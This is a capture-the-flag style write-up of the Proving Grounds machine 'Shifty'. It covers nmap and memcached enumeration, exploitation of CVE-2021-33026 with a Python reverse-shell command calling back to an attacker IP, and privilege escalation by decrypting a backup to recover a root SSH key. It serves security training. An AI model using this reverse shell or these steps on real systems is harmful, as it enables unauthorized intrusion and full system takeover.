#### Enumeration

Nmap

```
# Nmap 7.91 scan initiated Thu Dec 16 11:54:44 2021 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/kali/Documents/OffSecPG/Shifty/AutoRecon/results/192.168.55.59/scans/_full_tcp_nmap.txt -oX /home/kali/Documents/OffSecPG/Shifty/AutoRecon/results/192.168.55.59/scans/xml/_full_tcp_nmap.xml 192.168.55.59
adjust_timeouts2: packet supposedly had rtt of -1208241 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -1208241 microseconds.  Ignoring time.
Nmap scan report for 192.168.55.59
Host is up, received user-set (0.20s latency).
Scanned at 2021-12-16 11:54:45 EST for 371s
Not shown: 65530 filtered ports
Reason: 65530 no-responses
PORT      STATE  SERVICE   REASON         VERSION
22/tcp    open   ssh       syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 54:d8:d1:1a:e4:8c:66:48:37:ba:89:0a:9b:aa:db:47 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDSh58OLDmEhil0VmRkmNcijtg4KD/oQ4nP9I7PoS4uoangXCXpjJhuzsZJdKodqIRnp3G33o9HaRvx7LtIMPwl3cGcFNIDR9v+PDhDPgMKyRRJ48kdu3q0krzOWRvYnUEyLYjqDfb8VwBemuFA+gefLrMZLrLhhvArOG69zSCAOwKIC8MpQb+btXjU8c3QM6zKMX4XiEE5MM+TihshX/kJT8GgpJxzc+kXPuRgUkP5dgfQjgSsGos7UdHIGTStL4G2u9gXRj2KvamLZrWugN7onR1oMikWnbIki2OY6q4yn7aRo4RcXh4D9a+/L57R8oekVN4WEdGld2OBLzGCNQ89
|   256 fb:75:84:86:ec:b5:00:f3:4f:cb:c8:f2:18:85:42:b7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMTUc/WfFpP13Cs+MfoVp8EAwjODshXOpOBYCLG/SrFn5k1xSZVmqM3BVE/Dm2/AMOQGSmYzhMwUOj3rYuwnhWE=
|   256 2f:fd:b2:b1:6c:02:e8:a0:ba:e7:f7:52:80:3f:de:a3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAoY388QpNieLBhyB714K9LnjTUPfbgw4bfpGgdMBT0c
53/tcp    closed domain    reset ttl 63
80/tcp    open   http      syn-ack ttl 63 nginx 1.10.3
|_http-generator: Gatsby 2.22.15
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.10.3
|_http-title: Gatsby + Netlify CMS Starter
5000/tcp  open   http      syn-ack ttl 63 Werkzeug httpd 1.0.1 (Python 3.5.3)
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-server-header: Werkzeug/1.0.1 Python/3.5.3
|_http-title: Hello, world!
11211/tcp open   memcached syn-ack ttl 63 Memcached 1.4.33 (uptime 20753 seconds)
OS fingerprint not ideal because: maxTimingRatio (2.592000e+00) is greater than 1.4
Aggressive OS guesses: Linux 3.11 - 4.1 (93%), Linux 3.16 (91%), Linux 4.4 (91%), Linux 3.13 (88%), Linux 3.2 - 3.8 (87%), Linux 3.8 (87%), WatchGuard Fireware 11.8 (87%), Linux 3.10 - 3.16 (87%), Linux 3.10 - 3.12 (86%), Linux 2.6.32 (86%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=12/16%OT=22%CT=53%CU=%PV=Y%DS=2%DC=T%G=N%TM=61BB70C8%P=x86_64-pc-linux-gnu)
SEQ(SP=106%GCD=1%ISR=105%TI=Z%TS=8)
OPS(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)
WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
ECN(R=Y%DF=Y%TG=40%W=7210%O=M506NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=N)
T7(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 0.230 days (since Thu Dec 16 06:30:11 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   224.76 ms 192.168.49.1
2   224.85 ms 192.168.55.59

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec 16 12:00:56 2021 -- 1 IP address (1 host up) scanned in 372.78 seconds

```

I do not find the available vulnerability on the port 80 and 5000 website, so start checking service on 11211 port.

After a quick searching I understand the use of memcache. Installing the tools to help to easy get the information from memcache service.

```
sudo apt install libmemcached-tools
```

The stat command can show us some access information, but nothing useful.

```
memcstat --servers=192.168.100.59
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shifty/Shifty_2022.01.01_13h41m57s_001_.png)


Next we try to get the website store items, but it doesn't return anything back.

```
memcdump --servers=192.168.100.59
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shifty/Shifty_2022.01.01_13h52m35s_002_.png)

We have to browse the website on port 5000 first and it will generate the session.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shifty/Shifty_2022.01.01_14h00m00s_003_.png)

I was stuck here for a long time and then I accidentally noticed that this is a demo site made with FLASK, so I tried to search for FLASK, memcache and exploit as keywords and found vulnerability [CVE-2021-33026](https://github.com/CarlosG13/CVE-2021-33026).

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shifty/Shifty_2022.01.01_14h01m53s_004_.png)

Following the instructions for using the vulnerability We try to send the remote shell command.

```
python3 cve-2021-33026_PoC.py --rhost 192.168.100.59 --rport 5000 --cmd "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.49.100\",11211));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'" --cookie "session:f246b931-de84-4794-ba25-59c4bd3835df" 
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shifty/Shifty_2022.01.01_14h28m16s_005_.png)

Successfully obtained shell.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shifty/Shifty_2022.01.01_14h28m41s_006_.png)

#### Privilege Escalation

(Reference official walkthrough)

The ```/opt/backups/backup.py``` file contains hardcoded key.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shifty/Shifty_2022.01.01_22h58m08s_007_.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shifty/Shifty_2022.01.01_23h08m17s_008_.png)

Creating decrypt script file.

```
import sys
from des import des, CBC, PAD_PKCS5

k = des(b"87629ae8", CBC, b"\0\0\0\0\0\0\0\0", pad=None, padmode=PAD_PKCS5)
with open('/opt/backups/data/{}'.format(sys.argv[1])) as f:
    data = f.read()
    print(k.decrypt(data))
```

We need des file to execute the decrypt script. 

```
cp /opt/backups/des.py /tmp/des.py
```

Decrypting backup files.

```
python decrypt.py 31328fa57f5c504df041f7f4f45498c766c0d12c33f78f33cff66bca
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shifty/Shifty_2022.01.01_23h17m59s_009_.png)

It's a SSH private key.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shifty/Shifty_2022.01.01_23h21m20s_010_.png)

Using this SSH key for authentication.

```
chmod 400 id_rsa

ssh -i id_rsa root@192.168.134.59
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shifty/Shifty_2022.01.01_23h31m38s_011_.png)
